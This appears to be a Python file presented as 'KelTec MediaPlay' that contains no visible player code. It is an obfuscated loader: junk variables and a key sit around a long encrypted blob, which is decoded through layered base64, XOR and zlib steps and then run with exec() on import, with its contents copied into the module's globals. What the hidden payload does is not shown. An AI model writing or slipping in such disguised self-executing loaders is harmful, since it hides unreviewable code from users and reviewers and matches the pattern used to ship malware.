# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 193374 ^ 756732
_lx1_1 = len("cdef42")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-267666)
_lx3_3 = 628625 * 0
_lx4_4 = 920558 ^ 645745
_K = 'c98959bebeb699108a4bd06b56ca6db1e9d69cb7ce27149b4109b0440dd9c10f'
_M = 'PN6z2iYOkwOdrucQWkRVzQ7O0PFcjbWB4Z5HhtfZ6o9s3OHKbRLeWZOs5EcNQFmaD8/QoFvbtI/jnhCE0tvsiGmPsJk8FogPxqLk'
_D = '=YgHLXZaQRoGlrohbXzbOB7y1u/nsiXgPjEiHTSYXgie2MsYk22RAo2x2cVKhbNL10G7jjOJOHDg5GIEC1VdcaVqMeYkXWZ08y0yFR+ivfTuatehBlA2BU+ro4NcKeW+jyEJKFrSfvA6YD/6pYOP+nl+99zHfYhDcnWN9NNkw+EJoAGha85LdDdt7L6geAgRoZ8p/Ku1sKUWRTGNQ432XKviM6loY1pqdYmnpUbudhe13iWVJkkayx2TWSyRWQVu4Ajy8DCcYrVaQjMhiO/+6gT5b1KbvekKldt1U3wyAC/wwC+Btm39NI5x3fiGDobiztll8tEqatM1+QxW1APX35Z/UelamMUNaaGVc39x+B7U3BC/zjMY9sw5NgeEj1VKfOI9ZTGH7hHhRGoKzCCXLNnH7dOGk9nJ7WMgXoPdkvXhxpKaNCwWxvDifEURlkiocZHBO2tyGgvWqtzcKL0rS0dnlEfp2XIvEnF9QjkHlMf3xdZwlGVsO7TcP2dIYZZa84CsQaCEgHi02HeaRA97OQrSYbUR6TmjM4nnDFtZyo0nYE8C8dSsfd/M9N08ntP+gy/LXp0BwDz36kLKU0JOqmmjMccX/ZOrz8zw58SdnL0r7JQeaw0NdTjHI8FMs9atUiukUw7MGOUPKiMh6NdygzYrchdevdaghewZexh4JuNahoTFUHgRSQfVubYMpNTyOSr7mSsTWKEi87OYjYNZSxG++dgGR2WAhau07I1dUNOyt1DMj7Gt8PIL5VsbH8AiGxcDfCxpCljDuu4pccT2nbhJ1N48zDahmdhHYFm0ociLpF1NytMQqd1BboIz5Ksdksv3en3qMdWT0WckMb0ctUDAKUyG/rVqinxYHeec4bwW3JFLQwh0xTa6c9zc/5Zvg3q3bpbYBzjuEUweRQJ6jU3Ffso5PQAnAkF4wGgE+V9QAw2auPvvTj5xR07K4AWOiR94H4t1e4c3U0U3X29qfZSCxxEA9430TjwgPByIC7EkE5iZSGhLOMQa4q/XSu/ARdSkHu1ipAieZLlnlVIOh2Umdv9ToHz8BGrsG4DJjDMF0L054XnanVlJTvzVmkJWoAArRVVZPqh/6LxCqNcri5k6KhhwPllaJhr2fxwzKJ9NH9pmEXuE+P87gTXndZ9uHmZQWDbBiPZGrYH9d4mI2NEyLzjUU49PAulKKmdxKTimQGZnFTsy8cqj7iQgPBTcjhjGKahpjeYKKSORuWc/cM/ld58lWaeGRa8ltzq5iXV7JDAb2me5yrCSdN/ts1HFQzTr3P8EldFTTk4qiUwSsnnK1Pa9XBME6Sr+KIUAoHovIB2h4UujLBzwEiMG/RcNfpSV6KU1DGyaKActNonRTwt7RgEwxL2pKAN/kT/Mcp8JKjL31oCqMgvkzLdpV8Rdzxd4TR81j0lxHb44sEwkIrzPz5I/1NtObE1maybP0MizzeRu9yNGadjTtpCSYVH5h9KKvC3Fm3vqsRXTBCf2P8NFalwxwhzS+38RWNs5pntx7QMCPQBtyZeJhzouBQtwQjo7gZ8fx/im0ZiEdrPnQMllIvGSSmlxL/MW+Umbri637gDlGVFFESnQI5I0A+0TC5r11y++pCmcanE0cK0HHJkppUFbAPzBhLepDi02JbaYZnPdHat71pLjgeJm40YlqtZpn6H9RO3qpORqUS5dRxiwMEpYnlurTJqaJYbRomi/T4r7yA8lhyuD6macOVz2AdLLU2ELPfOwaPh9BOxtA7FSEKVhlw5rd+rQ9D3Yw21Yh0wS04bcN1LRskFVVyRPLOctfRNzbnPbt2+Z/LJIyYn39mPwLtDhfZ0YH7JHvpeiSVQVmYyvjmuL2mRAcNcaAhcd'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})